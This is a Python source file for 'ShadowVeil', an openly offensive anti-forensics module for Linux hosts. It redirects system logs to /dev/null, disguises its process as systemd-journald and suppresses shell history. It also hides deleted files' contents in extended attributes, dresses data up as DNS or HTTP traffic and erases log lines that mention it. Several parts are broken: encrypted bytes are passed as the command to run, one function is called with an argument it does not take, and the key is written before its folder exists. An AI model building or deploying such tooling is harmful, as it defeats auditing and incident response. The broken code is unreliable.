#!/usr/bin/env python3
# shadowveil/core.py

import os
import sys
import logging
import subprocess
import ctypes
import re
from pathlib import Path
from cryptography.fernet import Fernet
import binascii
import hashlib
import socket
import struct

class ShadowVeilCore:
    def __init__(self, cloak_mode="stealth", null_logs=True):
        self.original_log_paths = {}
        self.cloak_mode = cloak_mode  # stealth, normal, paranoid
        self.null_logs = null_logs
        self.crypto_store = "/dev/shm/.systemd-keys"
        self.setup_done = False
        self.fernet = None
        self.pid_mapping = {}

        # Configure based on cloak mode
        self.log_redirect_path = {
            "stealth": "/dev/shm/.systemd-journal",
            "paranoid": "/dev/null",
            "normal": "/var/log/journal"
        }[cloak_mode]

    def setup(self):
        """Initialize anti-forensics environment"""
        try:
            # Initialize cryptography
            self._init_crypto()
            
            # Create hidden crypto store
            os.makedirs(self.crypto_store, exist_ok=True)
            os.chmod(self.crypto_store, 0o700)
            
            # Process masking
            self._mask_process()
            
            # Log redirection
            self._redirect_syslog()
            self._setup_custom_logging()
            
            self.setup_done = True
            return True
        except Exception as e:
            self._safe_log(f"Setup failed: {str(e)}")
            return False

    def _init_crypto(self):
        """Initialize encryption systems"""
        # Generate or load master key
        key_path = f"{self.crypto_store}/.master.key"
        if os.path.exists(key_path):
            with open(key_path, "rb") as f:
                master_key = f.read()
        else:
            master_key = Fernet.generate_key()
            with open(key_path, "wb") as f:
                f.write(master_key)
                os.chmod(key_path, 0o600)
        
        self.fernet = Fernet(master_key)
        
        # Generate session keys
        self.session_key = os.urandom(32)
        self.hmac_key = os.urandom(32)

    def _redirect_syslog(self):
        """Redirect system logging paths"""
        if self.null_logs:
            redirect_target = "/dev/null"
        else:
            redirect_target = f"{self.log_redirect_path}/syslog"
        
        syslog_paths = [
            "/var/log/syslog",
            "/var/log/messages",
            "/var/log/kern.log"
        ]
        
        for path in syslog_paths:
            if os.path.exists(path):
                self.original_log_paths[path] = os.stat(path)
                try:
                    if not self.null_logs and not os.path.exists(redirect_target):
                        open(redirect_target, 'a').close()
                    os.rename(path, f"{path}.shadowveil.bak")
                    os.symlink(redirect_target, path)
                except PermissionError:
                    self._safe_log(f"Permission denied redirecting {path}")

    def _setup_custom_logging(self):
        """Configure Python logging to hidden location"""
        self.logger = logging.getLogger('ShadowVeil')
        self.logger.setLevel(logging.DEBUG)
        
        if self.null_logs:
            handler = logging.NullHandler()
        else:
            log_file = f"{self.log_redirect_path}/.python_svc.log"
            handler = logging.FileHandler(log_file)
        
        handler.setFormatter(logging.Formatter(
            '%(asctime)s systemd[%(process)d]: %(message)s',
            datefmt='%b %d %H:%M:%S'
        ))
        
        self.logger.addHandler(handler)
        sys.excepthook = self._custom_excepthook

    def _custom_excepthook(self, exc_type, exc_value, exc_traceback):
        """Mask Python exceptions in logs"""
        masked_msg = f"Service control process error [CODE:0x{id(exc_value) % 0xFFFF:04X}]"
        self.logger.error(self.encrypt_data(masked_msg))

    def _mask_process(self):
        """Disguise current process as systemd component"""
        try:
            # Process name masking
            self._set_proc_title(f"systemd-journald")
            
            # Environment sanitization
            os.environ['PATH'] = '/usr/sbin:/usr/bin:/sbin:/bin'
            os.environ['SHELL'] = '/bin/false'
            os.environ['PWD'] = '/'
            
            # PID masquerading
            self._masquerade_pid()
            
        except Exception as e:
            self._safe_log(f"Masking failed: {str(e)}")

    def _set_proc_title(self, title):
        """Set process title visible in ps/output"""
        try:
            # For systems with libc
            libc = ctypes.CDLL(None)
            buff = ctypes.create_string_buffer(len(title) + 1)
            buff.value = title.encode()
            libc.prctl(15, ctypes.byref(buff), 0, 0, 0)  # PR_SET_NAME
        except:
            try:
                # Fallback to setproctitle module
                import setproctitle
                setproctitle.setproctitle(title)
            except ImportError:
                pass

    def _masquerade_pid(self):
        """Create PID mapping for process disguise"""
        real_pid = os.getpid()
        fake_pid = 1  # Usually systemd PID
        
        # Create mapping file in crypto store
        pid_map_file = f"{self.crypto_store}/.pid_map"
        self.pid_mapping[real_pid] = fake_pid
        
        with open(pid_map_file, "a") as f:
            f.write(f"{real_pid}:{fake_pid}\n")
            os.chmod(pid_map_file, 0o600)

    def _safe_log(self, message):
        """Fallback logging when setup fails"""
        try:
            with open("/dev/shm/.sv_install.log", "a") as f:
                f.write(f"[ShadowVeil] {self.encrypt_data(message)}\n")
        except:
            pass

    def encrypt_data(self, data):
        """Encrypt data with session key"""
        if isinstance(data, str):
            data = data.encode()
        return self.fernet.encrypt(data)

    def decrypt_data(self, encrypted_data):
        """Decrypt data with session key"""
        return self.fernet.decrypt(encrypted_data).decode()

    def store_key(self, key_name, key_value):
        """Securely store cryptographic keys"""
        key_file = f"{self.crypto_store}/.{key_name}.key"
        encrypted_key = self.encrypt_data(key_value)
        
        with open(key_file, "wb") as f:
            f.write(encrypted_key)
            os.chmod(key_file, 0o600)
        
        return key_file

    def retrieve_key(self, key_name):
        """Retrieve stored cryptographic key"""
        key_file = f"{self.crypto_store}/.{key_name}.key"
        if os.path.exists(key_file):
            with open(key_file, "rb") as f:
                return self.decrypt_data(f.read())
        return None

    def execute_stealth(self, command):
        """Run command with masked environment"""
        env = os.environ.copy()
        env.update({
            'LANG': 'C',
            'HISTFILE': '/dev/null',
            'HISTFILESIZE': '0',
            'HISTSIZE': '0',
            'TERM': 'linux'
        })
        
        proc = subprocess.Popen(
            self.encrypt_data(command),
            shell=True,
            env=env,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL
        )
        
        # Map child PID
        self._masquerade_pid(proc.pid)
        return proc.pid

    def tunnel_file(self, file_path, hidden_path=None):
        """Filesystem tunneling using extended attributes"""
        if not hidden_path:
            hidden_path = f"/dev/shm/.{os.urandom(4).hex()}"
        
        try:
            # Store file in extended attributes
            with open(file_path, 'rb') as f:
                data = f.read()
                encrypted_data = self.encrypt_data(data)
            
            # Create carrier file
            with open(hidden_path, 'w') as f:
                f.write("SystemD Journal")
            
            # Set extended attribute
            os.setxattr(hidden_path, 'user.systemd.journal', encrypted_data)
            
            # Remove original
            os.unlink(file_path)
            return hidden_path
        except Exception as e:
            self.logger.error(f"Tunneling failed: {str(e)}")
            return file_path

    def camouflage_traffic(self, data, protocol="dns"):
        """Camouflage network traffic to look legitimate"""
        if protocol == "dns":
            # Encode as DNS-looking data
            encoded = binascii.hexlify(self.encrypt_data(data)).decode()
            chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
            return b".".join([chunk.encode() for chunk in chunks])
        
        elif protocol == "http":
            # Format as HTTP headers
            encrypted = self.encrypt_data(data)
            b64_data = binascii.b2a_base64(encrypted).decode().strip()
            return f"X-Systemd: {b64_data}\r\n".encode()
        
        return data

    def clean_log_artifacts(self, pattern=None):
        """Remove forensic artifacts from logs"""
        clean_pattern = pattern or r"shadowveil|stealth|sv_"
        try:
            for log_file in Path(self.log_redirect_path).glob('*'):
                if log_file.is_file():
                    self._sanitize_file(log_file, clean_pattern)
        except Exception as e:
            self.logger.error(f"Log maintenance failed [CODE:0x{id(e) % 0xFFFF:04X}]")

    def _sanitize_file(self, file_path, pattern):
        """Remove matching lines from log file"""
        try:
            with open(file_path, 'r+') as f:
                lines = f.readlines()
                f.seek(0)
                for line in lines:
                    if not re.search(pattern, line, re.IGNORECASE):
                        f.write(line)
                f.truncate()
        except Exception:
            pass

# CLI Interface for testing
if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description='ShadowVeil Core Module')
    parser.add_argument('--mode', choices=['stealth', 'paranoid', 'normal'], 
                        default='stealth', help='Operational mode')
    parser.add_argument('--null-logs', action='store_true', help='Send logs to /dev/null')
    parser.add_argument('--exec', help='Command to execute stealthily')
    parser.add_argument('--tunnel', help='File to tunnel in filesystem')
    args = parser.parse_args()

    sv = ShadowVeilCore(
        cloak_mode=args.mode,
        null_logs=args.null_logs
    )
    
    if sv.setup():
        print("[+] ShadowVeil initialized successfully")
        sv.logger.info("Service initialized [PID:%d]", os.getpid())
        
        if getattr(args, 'exec'):
            pid = sv.execute_stealth(args.exec)
            print(f"[+] Executed stealth command (PID: {pid})")
        
        if getattr(args, 'tunnel'):
            result = sv.tunnel_file(args.tunnel)
            print(f"[+] File tunneled to: {result}")
    else:
        print("[-] Initialization failed")